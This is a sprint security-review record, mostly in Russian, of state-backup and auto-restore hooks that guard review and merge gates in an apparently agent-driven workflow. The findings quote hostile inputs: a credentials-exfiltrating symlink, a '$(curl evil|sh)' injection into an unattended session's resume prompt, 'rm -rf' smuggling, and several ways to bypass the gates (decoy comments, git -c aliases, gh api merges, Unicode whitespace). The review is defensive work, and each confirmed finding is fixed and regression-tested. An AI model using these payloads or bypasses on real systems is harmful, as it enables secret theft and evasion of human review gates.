---
title: Review S61 — SPRINT_STATE v2 (Phase 6 artifact)
sprint: 61
updated: 2026-07-02
---
# Review S61 — state-integrity / state-backup / auto-restore

Reviewers (parallel, async):

- **architecture-reviewer: APPROVE_WITH_CONDITIONS** — HIGH #1 [BINDING] (staleness-blind auto-restore: integrity проверял структуру, не свежесть → мог тихо вернуть валидный-но-устаревший sprint/phase, которому верят phase-advance/review-gate) → ЗАКРЫТ: `stale_restore()` сверяет `last_task_sha` восстановленного бэкапа через `git merge-base --is-ancestor`; не-предок → эскалированный `STATE-INTEGRITY STALE-RESTORE WARN` (exit 0, fail-OPEN сохранён). MEDIUM #2 (бэкап-сеть холодная до первого коммита) → sprint-finish Phase 8 проверка; MEDIUM #3 (неатомарный backup+rotate) → +PID к имени; MEDIUM #4 (last_task_sha как 4-я ось) → заметка в триггер №2 ADR 0073.

- **security-auditor: 1 BLOCKER + 2 HIGH + MEDIUM/LOW — ВСЕ закрыты в спринте, re-tested:**
  - **BLOCKER #1** symlink-follow exfil (PROVEN: `glob`+`copy2 follow_symlinks=True` → `SPRINT_STATE.zzz.md -> ~/.aws/credentials` протекал секрет в git-tracked, pushed state) → `safe_backups()` отсекает симлинки + проверяет `resolve().parent == backup_dir`; запись через `write_text` уже провалидированного содержимого.
  - **HIGH #2** blind restore невалидированного gitignored-бэкапа → подделанный `| 6 Review | done |` проходил money-гейты → restore ВАЛИДИРУЕТ содержимое бэкапа ДО установки; невалидный → идёт к старшему; ни одного валидного → файл НЕ перезаписывается (повреждение видимо). *Остаток:* бэкап с валидным frontmatter + валидным-предком last_task_sha + подделанным телом phase-таблицы всё ещё установится (validate не парсит тело таблицы) — это baseline «local user compromised» + tamper-evidence → S62 (подпись/hash бэкапов).
  - **HIGH #3** `last_task_sha` unsanitized → `$(curl evil|sh)` в resume-prompt unattended-сессии → `validate()` требует полный fullmatch `^[0-9a-fA-F]{7,40}$` (весь value, не первый токен — `a87deec ; rm -rf` тоже reject); невалидный → corrupt → reject.
  - **MEDIUM #4** sticky lexicographic `sorted()[-1]` → выбор по mtime. **LOW #6** escape-injection в лог → `_sanitize()` вырезает control-байты. **LOW #7** self-skip подстрока → сужен до форм вызова скрипта.
  - **Verified clean:** секретов не читает/не пишет; `RESUME_PROMPT` — константа; sid-guard на месте; state-backup.sh без инъекций; backup-dir gitignored (S57-урок).

## Доказательства (свежие, verification-before-completion)

- Exploit-regression harness (`scratchpad/exploit_regression.py`): **9/9 PASS** — symlink-exfil blocked, invalid-backup-not-installed, walk-to-valid, poison-sha×4 rejected, clean-sha valid, mtime>lexicographic, non-ancestor→stale, HEAD→fresh, escape-sanitized.
- `bash -n` 16 хуков OK; `py_compile` OK; `ruff check` All checks passed; kit-mirror drift clean.
- **Adversarial bypass-hunt round-1** (workflow, 4 diverse-lens skeptics + refutation): 6 кандидатов → **2 ПОДТВЕРЖДЕНЫ** против пропатченного кода (это ценность метода — нашли то, что 2 ревьюера пропустили):
  - **BLOCKER (dest-symlink):** сам `SPRINT_STATE.md` подменён симлинком наружу → `write_text` следовал за ним → перезапись `.git/hooks/pre-commit` / `~/.claude/settings.json` содержимым бэкапа. → ЗАКРЫТ: `is_symlink()` guard + `atomic_write` (mkstemp+`os.replace`, не следует dest-симлинку).
  - **HIGH (parser-differential):** `frontmatter()` резал `#`-коммент (даже `hex#$(curl)` без пробела — реальный YAML НЕ считает это комментарием) + `splitlines()` рвал `\x0c`/`\x85`/` ` → `_SHA_RE` валидировал НОРМАЛИЗОВАННЫЙ токен, сырая нагрузка утекала в pushed state + resume-Bash-prompt → RCE. → ЗАКРЫТ: `_DANGER`-скан блока + `raw_last_task_sha()` (сырая строка, только истинный ` #`-коммент) + poller RESUME_PROMPT помечает поле недоверенным.
  - Regression harness расширен 9→12 кейсов (оба новых эксплойта с точными payload'ами) → **12/12 PASS**.
- **Adversarial bypass-hunt round-2** (loop-until-dry: скептики бьют по самим round-1 фиксам): 3 кандидата → **2 ПОДТВЕРЖДЕНЫ** (обе MEDIUM, advisory-gated):
  - **dup-key smuggling:** `last_task_sha: <hex>` + `last_task_sha: $(payload)` — `raw_last_task_sha` брал first-wins (чистый), а last-wins консьюмер (dict/yaml/LLM) видел payload. → ЗАКРЫТ: validate() отклоняет любой дублирующийся ключ frontmatter (заодно dup-phase обход merge-гейта).
  - **log-symlink + newline-name:** `integrity.log` подменён симлинком → `open("a")` дописывал строки в чужой файл (`.git/hooks/pre-push`); newline в имени бэкапа расщеплял лог-запись. → ЗАКРЫТ: `log()` O_NOFOLLOW + `_CTRL_RE` стрипает `\n` + `safe_backups` отсекает newline-имена; тот же фикс в poller-twin.
  - Regression 12→16 кейсов, **16/16 PASS**. Core atomic-write/dest-symlink подтверждён чистым (os.replace не следует симлинку).
- **Adversarial bypass-hunt round-3** (residual validator↔consumer differentials): **1 HIGH ПОДТВЕРЖДЕН** — не-ASCII пробел (`phase: 4<U+00A0>`): Python `.strip()`/`\s` считает NBSP пробелом → validate видит чистый `4`; shell-гейты (POSIX `[:space:]`, ASCII-only) видят `4\xa0` → `case [2-8]` мимо → все 3 phase-гейта fail-open (reopen KIT-002). → ЗАКРЫТ в validate: generic `isspace()`-reject любого не-ASCII пробела + strict-ASCII `_FIELD_RE` для sprint/branch (закрыл и zero-width U+200B/FEFF/2060 на branch, round-4-упреждающе). (Leading-space/indent dup из round-3 lens — упреждающе закрыт strict-flat-line ещё до вердикта.)
- **Adversarial bypass-hunt round-4** (confirmation): **1 HIGH ПОДТВЕРЖДЕН** — архитектурный, глубже валидатора: phase-гейты читают СЫРОЙ SPRINT_STATE и НИКОГДА не зовут validate(); integrity-хук — параллельный side-channel-репейрер, не барьер. Cold-net (пустой .backup) + параллельный запуск хуков → forged `4\xa0` доходит до гейта раньше восстановления → fail-open детерминирован. → ЗАКРЫТ В САМИХ ГЕЙТАХ: case-армы теперь `[2-8]→block-active | канон-неактивные→allow | *→BLOCK-noncanon` (fail-CLOSED). Forged unicode/zero-width/мусор phase теперь блокируется гейтом независимо от репейрера/порядка/cold-net. Bash-regression 13/13.
- **Adversarial bypass-hunt round-5**: **1 HIGH + 1 MEDIUM ПОДТВЕРЖДЕНЫ** — self-skip substring dodge (pre-existing S59-класс): декой `gh pr merge <деньги> # bash review-gate.sh` (или `&& bash ./review-gate.sh`) срабатывал раньше детекта операции → обход KIT-003 money-gate с НУЛЕВОЙ подделкой артефактов (хуже задокументированного S62 body-table residual). phase-advance/sprint-flow — тот же голый-substring self-skip. → ЗАКРЫТ во всех 3 гейтах: content-based self-skip УДАЛЁН, детект операции решает (голый запуск хука не содержит `gh pr merge`/`git push` → `*) exit 0`; реальный op гейтится всегда). Оба декой-варианта (#comment, &&) теперь GATED. Bash-regression +12 self-skip кейсов.
- **Adversarial bypass-hunt round-6** (hard-cap): **1 HIGH ПОДТВЕРЖДЕН** — op-detect подстрокой принципиально дыряв: `git -c http.x=y merge`, `gh api .../pulls/N/merge`, инлайн-алиас `git -c alias.z=merge z`, `git pull` минуют детект (доказано — реально мержат/пушат). → ЧАСТИЧНО ЗАКРЫТ: whitespace-норм + срез git-глобалок `-c/-C X` + REST-эндпоинт `gh api` (proven `-c`/`gh api` векторы теперь GATED, regression +8). ОСТАТОК (инлайн-алиас-резолв, `git pull`-семантика, argv-классификация) → выделенный security-спринт [[../kit-op-detect-hardening-backlog]] (money-контур защищён diff-детектом → process-integrity, не money-safety).
- **Hard-cap на 6 раундах.** Тренд: R1 BLOCKER+HIGH (мой S61-код) → R2 MEDIUM×2 → R3 HIGH → R4-6 HIGH (пре-существующие S59-гейты). Все ПОДТВЕРЖДЁННЫЕ закрыты + regression-locked (32 python + 38 bash). Остаток (body-table forgery, op-detect argv) → backlog. Round-7 не запускается: money-primary diff-gated, остаток архитектурный.

## Принятые границы

- **Forged-valid-backup** (валидный frontmatter+ancestor sha, подделанное тело таблицы) — validate структурный, не семантический → S62 tamper-evidence.
- **fail-OPEN repairer, не gate** — state-integrity никогда не блокирует; единственный эффект — side-effect восстановление. Money-гейты (phase-advance/review-gate) верят файлу, который хук авто-переписывает. Приемлемо ТОЛЬКО потому что #1/#2 закрыли «что именно пишется». Инвариант «gate-input пишется только человеком/ревью» → S62 manifest.

Blockers: 0 (BLOCKER #1 закрыт и regression-tested)
